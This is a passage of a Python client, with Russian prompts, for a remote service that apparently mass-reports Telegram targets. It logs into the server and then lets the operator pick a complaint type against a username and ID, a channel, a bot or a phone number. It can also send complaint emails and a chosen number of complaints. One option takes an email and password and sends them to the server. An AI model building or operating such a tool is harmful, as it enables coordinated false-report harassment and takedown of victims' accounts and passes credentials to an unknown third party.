    print("Telegram: https://t.me/+2rl-A4wgH0NmMTUy")
    print("Авторизация")
    username = input("Введите логин: ")
    password = input("Введите пароль: ")

    auth_response, status_code = login(username, password)
    if status_code == 200 and auth_response.get("status") == "ok":
        print(auth_response.get("message"))
        session_id = auth_response.get("session_id")
    else:
        print(auth_response.get("message", "Ошибка авторизации"))
        return

    while True:
        command = input("Введите команду (run/exit): ").strip().lower()
        if command not in ("run", "exit"):
            print("Неизвестная команда, попробуйте снова.")
            continue

        params = {}
        if command == "run":
            choice = input("Выберите опцию (1-8): ").strip()
            params["choice"] = choice
            if choice == "1":
                params["comp_choice"] = input("Выберите тип жалобы (1-6): ").strip()
                params["username"] = input("юзернейм: ").strip()
                params["id"] = input("айди: ").strip()
                if params["comp_choice"] == "4":
                    params["num"] = input("Номер: ").strip()
            elif choice == "2":
                params["ch_choice"] = input("Выберите тип жалобы (1-5): ").strip()
                params["channel_link"] = input("ссылка на канал: ").strip()
                params["channel_violation"] = input("ссылка на нарушение (в канале): ").strip()
            elif choice == "3":
                params["bot_ch"] = input("Выберите вариант (1-2): ").strip()
                params["bot_user"] = input("юз бота: ").strip()
            elif choice == "4":
                params["comp_text"] = input("Введите текст своего письма: ").strip()
                params["comp_teme"] = input("Введите тему своего письма: ").strip()
            elif choice == "5":
                params["message"] = input("Введите текст жалобы: ").strip()
                params["message_count"] = input("Введите количество жалоб: ").strip()
            elif choice == "6":
                params["email"] = input("Введите email: ").strip()
                params["password"] = input("Введите пароль: ").strip()
            elif choice == "7":
                params["number"] = input("Введите номер: ").strip()

        cmd_response, cmd_status = send_command(command, session_id, params)
        print(cmd_response.get("message", "Нет ответа от сервера"))
        if "output" in cmd_response and cmd_response["output"]:
            print("=== Вывод скрипта ===")
            print(cmd_response["output"])
        if "error" in cmd_response and cmd_response["error"]:
            print("=== Ошибки ===")
            print(cmd_response["error"])

        if command == "exit":
            print("Выход из программы.")
            break

if __name__ == "__main__":
    main()
